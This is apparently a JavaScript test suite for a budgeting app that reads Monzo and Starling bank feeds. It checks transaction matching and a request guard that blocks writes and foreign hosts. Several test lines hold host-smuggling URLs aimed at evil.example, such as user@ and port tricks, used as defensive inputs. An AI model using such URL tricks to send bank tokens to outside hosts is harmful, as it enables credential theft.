    monzo.txns.push(mtx("tx_x1thu", "2026-11-17", -1050, {merchant: merchant("Tesco", "groceries"), category: "groceries", time: "11:30:00"}));
    if (thuFirst) { NOW += 15 * 60000; G.c.bankPoll(); }
    const pk = JSON.parse(Buffer.from(G.call({key: G.kE, action: "app.link", app: "peckish"}).link.split("#connect=")[1], "base64url").toString()).k;
    G.call({key: pk, ops: [{op: "put", table: "transactions", row: {id: "t-pk-x1", date: "2026-11-17", person: "ethan", amount: 10, budget: "e-food-b", account: "", split: "", note: "Tesco (Peckish)", source: "peckish"}}]});
    NOW += 15 * 60000; G.c.bankPoll();
    const r = (id) => grow(G, "transactions").find(x => x.id === id) || {};
    return {pk: r("t-pk-x1"), mon: r("bk-monzo-tx_x1mon"), thu: r("bk-monzo-tx_x1thu")};
  };
  let x = run(false);
  ok("X1: Thursday's Peckish shop is Thursday's payment, not Monday's checked one", x.pk.bankId === "tx_x1thu" && x.pk.amount === 10.5 && x.mon.deleted !== true && x.mon.amount === 12 && x.mon.split === "half" && !x.thu.id, x);
  x = run(true);
  ok("X1: also when the bank brought Thursday's in first", x.pk.bankId === "tx_x1thu" && x.mon.deleted !== true && x.thu.deleted === true, x);
}
{
  // X2: a one-off £300 to the household bills company the day before the bill (£420, it varies). Read alone, it's taken
  // for the bill, and the bank feed notes the bill came to £300. When the £430 direct debit comes in on the bill's day,
  // that's the bill (£430), and the £300 comes in as a payment: the £300 the feed noted itself doesn't make the one-off
  // look like the bill to the penny
  freshMonzo(); NOW = RealDate.parse("2026-10-31T12:00:00Z");
  monzo.txns = monzoData(planned).filter(t => t.created < "2026-10-31");
  monzo.txns.push(mtx("tx_x2oneoff", "2026-10-31", -30000, {counterparty: {name: "HOUSEHOLD BILLS LTD"}, category: "bills", time: "09:00:00"}));
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const ex = () => (grow(G, "exceptions").find(x => x.id === "x-e-flat-2026-11-01-bank-ethan") || {}).amount;
  const live = () => grow(G, "transactions").filter(r => /x2/.test(r.id) && r.deleted !== true).map(r => r.id).join();
  ok("X2: read alone, the one-off is taken for the bill", ex() === 300 && live() === "", [ex(), live()]);
  NOW = RealDate.parse("2026-11-02T12:00:00Z"); monzo.txns.push(mtx("tx_x2dd", "2026-11-01", -43000, {counterparty: {name: "HOUSEHOLD BILLS LTD"}, category: "bills", time: "07:00:00"}));
  G.c.bankPoll();
  ok("X2: the direct debit that then comes in is the bill, and the one-off a payment", ex() === 430 && live() === "bk-monzo-tx_x2oneoff", [ex(), live()]);
  NOW += 15 * 60000; G.c.bankPoll();
  ok("X2: and it stays that way", ex() === 430 && live() === "bk-monzo-tx_x2oneoff", [ex(), live()]);
}
{
  // X3: a Peckish shop has no account. Linked to a payment from an account mapped to something other than the main
  // account, it's that account's, as the bank's own copy would have been (not the main account's)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); G.call({key: G.kE, ops: [{op: "put", table: "accounts", row: {id: "e-joint", owner: "ethan", name: "Food account", kind: "main", order: 6}}]});
  connectMonzo(G, {acc_00009main: "e-joint"});
  monzo.txns.push(mtx("tx_x3", "2026-11-17", -2210, {merchant: merchant("Aldi", "groceries"), category: "groceries", time: "11:00:00"}));
  const pk = JSON.parse(Buffer.from(G.call({key: G.kE, action: "app.link", app: "peckish"}).link.split("#connect=")[1], "base64url").toString()).k;
  G.call({key: pk, ops: [{op: "put", table: "transactions", row: {id: "t-pk-x3", date: "2026-11-17", person: "ethan", amount: 22, budget: "e-food-b", account: "", split: "", note: "Aldi (Peckish)", source: "peckish"}}]});
  NOW += 15 * 60000; G.c.bankPoll();
  const r = grow(G, "transactions").find(x => x.id === "t-pk-x3") || {};
  ok("X3: a linked Peckish shop is the paying account's", r.bankId === "tx_x3" && r.account === "e-joint", r);
}
{
  // X4: a pot's mapping taken off (deleted) in the sheet: mapping it again in Budgie works, rather than saving the
  // choice on a row that stays taken off (which every read ignores)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main", pot_bills: "e-bills"});
  const sh = G.env.sheets.settings, rowsS = grow(G, "settings"), m = rowsS.find(r => r.id === "ethan:bank.map.pot_bills"), head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  sh.getRange(m._row, head.indexOf("deleted") + 1).setValue(true);
  ok("X4: taken off, it's not mapped", G.call({key: G.kE, action: "bank.status"}).bank.accounts.find(a => a.extId === "pot_bills").mappedTo === null);
  G.call({key: G.kE, action: "bank.map", extId: "pot_bills", account: "e-bills"});
  ok("X4: mapped again, it is", G.call({key: G.kE, action: "bank.status"}).bank.accounts.find(a => a.extId === "pot_bills").mappedTo === "e-bills");
}
{
  // X5: a saving budget of Ethan's typed into the sheet with Sophie's LISA as its account puts her LISA in his payday
  // plan. His Moneybox payment of that amount still goes to his own LISA, never into hers
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned).filter(t => t.id !== "tx_moneybox");
  monzo.txns.push(mtx("tx_x5", "2026-10-30", -12300, {counterparty: {name: "Moneybox"}, category: "savings", description: "MONEYBOX"}));
  const G = bankEnv(t => { t.accounts.push({id: "s-lisa", owner: "sophie", name: "Sophie's LISA", kind: "lisa", order: 9}); t.budgets.push({id: "e-odd", person: "ethan", name: "Odd", amount: 123, mode: "saving", account: "s-lisa"}); });
  connectMonzo(G, {acc_00009main: "e-main"});
  const m = grow(G, "moves").find(x => x.id === "bk-monzo-tx_x5") || {};
  ok("X5: a Moneybox payment is only ever a move into your own account", m.to !== "s-lisa" && (!m.to || ["e-lisa", "e-isa"].indexOf(m.to) >= 0), m);
}
{
  // Y1: a penny is a penny. Matching allows a penny either way (a hand-logged £3.30 is the bank's £3.31), but what's
  // kept is the bank's amount: a pending payment that settles a penny different, a Peckish shop a penny off, a balance
  // that moved by a penny
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  monzo.txns.push(mtx("tx_y1hold", "2026-11-17", -1000, {merchant: merchant("Esso", "transport"), category: "transport", pending: true, time: "09:00:00"}));
  monzo.txns.push(mtx("tx_y1aldi", "2026-11-17", -2331, {merchant: merchant("Aldi", "groceries"), category: "groceries", time: "10:00:00"}));
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const pk = JSON.parse(Buffer.from(G.call({key: G.kE, action: "app.link", app: "peckish"}).link.split("#connect=")[1], "base64url").toString()).k;
  G.call({key: pk, ops: [{op: "put", table: "transactions", row: {id: "t-pk-y1", date: "2026-11-17", person: "ethan", amount: 23.3, budget: "e-food-b", account: "", split: "", note: "Aldi (Peckish)", source: "peckish"}}]});
  const h = monzo.txns.find(t => t.id === "tx_y1hold"); h.amount = -1001; h.settled = iso("2026-11-17", "11:00:00");
  monzo.balance.balance += 1;
  NOW += 15 * 60000; G.c.bankPoll();
  monzo.balance.balance -= 1;
  const r = (id) => grow(G, "transactions").find(x => x.id === id) || {};
  ok("Y1: a hold that settles a penny more is the penny more", r("bk-monzo-tx_y1hold").amount === 10.01, r("bk-monzo-tx_y1hold"));
  ok("Y1: a Peckish shop a penny off takes the bank's amount", r("t-pk-y1").bankId === "tx_y1aldi" && r("t-pk-y1").amount === 23.31, r("t-pk-y1"));
  ok("Y1: a balance a penny different is saved", (grow(G, "valuations").find(v => v.id === "bk-acc_00009main-2026-11-17") || {}).amount === 543.22, grow(G, "valuations").find(v => v.id === "bk-acc_00009main-2026-11-17"));
}
{
  // Y2: a payment you logged by hand the day before the bank's date (a late-night shop the bank dates after midnight)
  // is linked, and dated when the bank says, as the bank's own copy would have been: its date decides which pay period
  // and week it counts in
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  monzo.txns.push(mtx("tx_y2", "2026-11-17", -1475, {merchant: merchant("Late Shop", "shopping"), category: "shopping", time: "00:20:00"}));
  const G = bankEnv(t => { t.transactions.push({id: "app-y2", date: "2026-11-16", person: "ethan", amount: 14.75, budget: "e-fun", account: "e-main", note: "Late Shop", source: "app"}); });
  connectMonzo(G, {acc_00009main: "e-main"});
  const r = grow(G, "transactions").find(x => x.id === "app-y2") || {};
  ok("Y2: a linked payment takes the bank's date", r.bankId === "tx_y2" && r.date === "2026-11-17" && !grow(G, "transactions").some(x => x.id === "bk-monzo-tx_y2" && x.deleted !== true), r);
}
{
  // Y3: the one way out to a bank only knows the two banks' hosts: a host that's a built-in name isn't one of them
  const G = bankEnv();
  let threw = ""; try { G.c.bankHttp_("get", "https://constructor/x"); } catch (e) { threw = e.message; }
  ok("Y3: a host called like a built-in name is turned away", /only talks to Monzo and Starling/.test(threw), threw);
}
// ================= read only, always =================
const allowedPost = ["https://api.monzo.com/oauth2/token", "https://api.monzo.com/oauth2/logout"];
const bad = reqs.filter(r => { const u = new URL(r.url); return !(r.method === "get" || (r.method === "post" && allowedPost.indexOf(u.origin + u.pathname) >= 0)); });
ok("every request was a GET, except Monzo sign in, refresh and logout", reqs.length > 20 && bad.length === 0, bad);
ok("only Monzo and Starling were called", reqs.every(r => /^https:\/\/(api\.monzo\.com|api\.starlingbank\.com)\//.test(r.url)));
ok("nothing that moves money or writes", !reqs.some(r => /\/(pots\/[^/]+\/(deposit|withdraw)|feed$|attachment|transaction-receipts|webhooks|payments|transfers)/.test(new URL(r.url).pathname) && new URL(r.url).host === "api.monzo.com") && !reqs.some(r => new URL(r.url).host === "api.starlingbank.com" && r.method !== "get"));
ok("redirects aren't followed (a bearer token never goes elsewhere)", reqs.every(r => r.followRedirects === false));
const guard = (m, u) => { try { c.bankHttp_(m, u, {}); return false; } catch (e) { return /only/.test(e.message); } };
ok("the request guard refuses writes", guard("put", "https://api.monzo.com/pots/pot_bills/deposit") && guard("put", "https://api.monzo.com/pots/pot_bills/withdraw") && guard("post", "https://api.monzo.com/feed") &&
  guard("post", "https://api.monzo.com/webhooks") && guard("delete", "https://api.monzo.com/webhooks/x") && guard("post", "https://api.monzo.com/attachment/upload") && guard("put", "https://api.starlingbank.com/api/v2/payments/local/account/x/category/y") &&
  guard("post", "https://api.starlingbank.com/api/v2/identity/token") && guard("post", "https://api.monzo.com/oauth2/token/../../pots/x/deposit") && guard("post", "https://api.monzo.com/oauth2/tokenx"));
ok("but lets sign in and logout through", !guard("post", "https://api.monzo.com/oauth2/token") && !guard("post", "https://api.monzo.com/oauth2/logout") && !guard("get", "https://api.monzo.com/accounts"));
ok("and other hosts", guard("get", "https://evil.example/") && guard("get", "https://api.monzo.com.evil.example/x") && guard("get", "https://user@api.monzo.com/x") && guard("get", "http://api.monzo.com/accounts"));
// Q4: the whole address is checked, so a port or a user@ part can't send a bank key somewhere else
ok("Q4: an address that only starts like Monzo's is refused", guard("get", "https://api.monzo.com:443@evil.example/x") && guard("get", "https://api.monzo.com#@evil.example/") && guard("get", "https://api.monzo.com:8080/accounts") && guard("get", "https://api.monzo.com/x@evil.example") && !guard("get", "https://api.monzo.com/transactions?account_id=acc_1&since=2026-01-01T00%3A00%3A00.000Z&expand%5B%5D=merchant"));
// the code itself: one way out, and no write method anywhere
ok("BankFeeds.gs has a single UrlFetchApp.fetch", (SRC.match(/UrlFetchApp\.fetch\s*\(/g) || []).length === 1 && /function bankHttp_[\s\S]*?UrlFetchApp\.fetch/.test(SRC.slice(SRC.indexOf("function bankHttp_"), SRC.indexOf("function bankErr_"))));
const methods = (SRC.match(/bankHttp_\(\s*"([a-z]+)"/g) || []).map(m => m.match(/"([a-z]+)"/)[1]);
ok("every request in BankFeeds.gs is a GET or POST", methods.length >= 6 && methods.every(m => m === "get" || m === "post"), methods);
ok("BankFeeds.gs never names a write endpoint", !/\/(deposit|withdraw)\b|\/attachment|transaction-receipts|\/webhooks|payments\/local|"\/feed"/.test(SRC));
const posts = (SRC.match(/bankHttp_\(\s*"post"[^)]*/g) || []);
ok("the only POSTs are Monzo token and logout", posts.length >= 3 && posts.every(p => /MONZO_API_ \+ "\/oauth2\/(token|logout)"/.test(p)), posts);

// Q8: the tab the Monzo sign-in opens in can't reach back into Budgie (window.opener)
const APPJS = fs.readFileSync(path.join(__dirname, "../app.js"), "utf8");
ok("Q8: every tab Budgie opens for a bank sign-in drops its opener", (APPJS.match(/window\.open\(/g) || []).length === (APPJS.match(/window\.open\([^;]*\);\s*(\/\/[^\n]*\n\s*)?try \{ if \(w\) w\.opener = null; \}/g) || []).length);

// ================= no secrets anywhere they shouldn't be =================
const secrets = Object.values(SECRET).concat(["acc-ETHAN-3-eeeeeeee", "ref-ETHAN-3-ffffffff", "acc-ETHAN-4-gggggggg"]);
const sheetText = JSON.stringify(Object.values(F.env.sheets).map(s => s._s.cells));
const statusText = Object.keys(F.env.props).filter(k => /^BANK_STATUS_/.test(k)).map(k => F.env.props[k]).join("\n");
const leaks = (label, text) => secrets.filter(x => String(text).indexOf(x) >= 0).map(x => label + ": " + x.slice(0, 12));
const found = [].concat(leaks("responses", responses.join("\n")), leaks("logs", F.env.logs.join("\n")), leaks("sheet", sheetText), leaks("status", statusText));
ok("no token, refresh token, client secret or code in any response, log, the sheet or the status", found.length === 0, found);
ok("no secret anywhere in Script Properties (editors can see those)", Object.keys(F.env.props).every(k => !secrets.some(x => F.env.props[k].indexOf(x) >= 0)));
ok("secrets only under BANK_TOKEN_ / BANK_CLIENT_ / BANK_OAUTH_ in the owner's User Properties", Object.keys(F.env.userProps).every(k => /^BANK_(TOKEN|TOKEN_NEXT|CLIENT|OAUTH)_/.test(k)));
// an error from the bank is shown without anything secret in it
ok("errors are scrubbed", c.bankScrub_("sophie", "failed Bearer " + SECRET.starling + " token=" + SECRET.starling).indexOf(SECRET.starling) < 0);

// ================= triggers =================
c.installBankTrigger(); c.installBankTrigger(); c.installTriggers();
const trig = F.env.triggers.map(t => t.getHandlerFunction()).sort();
ok("bank poll every 15 minutes, kept by installTriggers", trig.filter(n => n === "bankPoll").length === 1 && trig.indexOf("refreshBudgetTabs") >= 0, trig);
ok("sync without an action is unchanged", call({key: kE}).ok === true && Array.isArray(call({key: kE}).rows.transactions));

console.log(fails ? fails + " failed, " + passes + " passed" : "All " + passes + " passed");
process.exit(fails ? 1 : 0);
